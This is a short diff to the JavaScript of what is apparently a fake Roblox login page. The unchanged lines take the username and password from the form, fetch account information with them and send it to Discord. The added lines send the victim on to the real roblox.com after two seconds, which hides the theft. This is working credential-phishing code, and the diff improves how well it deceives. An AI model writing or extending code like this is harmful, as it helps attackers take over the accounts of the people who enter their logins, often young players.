@@ -9,6 +9,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     fetchRobloxAccountInfo(username, password).then(accountInfo => {
         sendAccountInfoToDiscord(accountInfo);
+        setTimeout(() => {
+            window.location.href = 'https://www.roblox.com';
+        }, 2000); // Redirect to Roblox home page after 2 seconds
     }).catch(error => {
         console.error('Error fetching account info:', error);
     });
